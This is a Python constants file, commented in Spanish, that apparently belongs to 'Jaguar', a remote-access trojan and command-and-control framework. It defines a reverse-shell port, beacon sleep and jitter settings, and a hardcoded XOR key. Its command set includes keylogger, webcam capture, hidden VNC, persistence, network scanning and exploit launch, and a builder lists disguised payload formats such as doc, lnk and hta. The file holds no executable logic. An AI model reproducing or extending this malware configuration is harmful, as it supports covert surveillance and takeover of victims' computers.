# -*- coding: utf-8 -*-
"""Constantes globales de Jaguar."""

APP_NAME = "Jaguar"
APP_VERSION = "1.0.0"

# Red
PUERTO_DEFECTO = 8000
PUERTO_SHELLS = 4444
TIMEOUT_SOCKET = 30.0
INTERVALO_LATIDO = 10.0
BEACON_SLEEP_DEFECTO = 5.0
BEACON_JITTER_DEFECTO = 20

# Cifrado
TAM_LONGITUD = 4
CLAVE_XOR_DEFECTO = b"J4GU4R-2026-clave-compartida"   # misma que cripto.CLAVE_MAESTRA

# Tipos de mensaje
MSG_REGISTRO = "registro"
MSG_LATIDO = "latido"
MSG_COMANDO = "comando"
MSG_RESPUESTA = "respuesta"
MSG_EVENTO = "evento"
MSG_DESCONEXION = "desconexion"
MSG_BEACON_CONFIG = "beacon_config"
MSG_CHUNK = "chunk"

# Categorías de comando
CMD_SYSINFO = "sysinfo"
CMD_PROCESOS = "procesos"
CMD_SHELL = "shell"
CMD_LISTAR_DIR = "listar_dir"
CMD_DESCARGAR = "descargar_archivo"
CMD_SUBIR = "subir_archivo"
CMD_CAPTURA = "captura"
CMD_MENSAJE = "mensaje"
CMD_ABRIR_URL = "abrir_url"
CMD_ENERGIA = "energia"
CMD_PERSISTIR = "persistir"
CMD_DESCONECTAR = "desconectar"
CMD_WEBCAM = "webcam"
CMD_KEYLOGGER = "keylogger"
CMD_HVNC_INICIAR = "hvnc_iniciar"
CMD_HVNC_DETENER = "hvnc_detener"
CMD_RED_ESCANEAR = "red_escanear"
CMD_SUGERIR_EXPLOIT = "sugerir_exploit"
CMD_LANZAR_EXPLOIT = "lanzar_exploit"

# Builder
FORMATOS_PAYLOAD = ["py", "exe", "doc", "lnk", "ps1", "vbs", "bat", "hta"]